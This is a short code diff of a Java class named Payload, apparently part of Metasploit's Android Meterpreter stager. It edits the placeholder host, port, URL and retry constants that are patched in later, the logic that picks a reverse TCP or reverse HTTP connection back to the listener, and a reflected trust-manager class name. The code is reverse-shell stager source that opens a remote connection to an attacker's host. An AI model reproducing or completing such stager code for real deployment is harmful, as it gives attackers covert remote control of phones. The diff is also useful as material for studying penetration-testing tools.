@@ -21,8 +21,8 @@ public class Payload {
 
     public static final String LHOST =	"XXXX127.0.0.1                       ";
     public static final String LPORT = 	"YYYY4444                            ";
-    public static final String URL 	 = 	"ZZZZhttp://255.255.255.255          ";
-    public static final String TRIALS = "TTTT10                              ";
+    public static final String URL 	 = 	"ZZZZ                                ";
+    public static final String TRIALS = "TTTT                                ";
 
     public static Context context;
 
@@ -40,7 +40,7 @@ public class Payload {
     
     private static boolean startReverseConn() {
     	try {
-    		if (URL.contains("255.255.255.255"))
+    		if (URL.substring(4).trim().length() == 0)
 	    		reverseTCP();
 	    	else 
 	    		reverseHTTP();
@@ -90,7 +90,7 @@ public class Payload {
     	
     	if (lhost.startsWith("https")) { 
     		urlConn = (HttpsURLConnection) url.openConnection();
-    		Class.forName("com.metasploit.android.stage.PayloadTrustManager")
+    		Class.forName("com.metasploit.stage.PayloadTrustManager")
     		.getMethod("useFor", new Class[] {URLConnection.class}).invoke(null, new Object[] {urlConn});
     	}
     	else urlConn = (HttpURLConnection) url.openConnection();
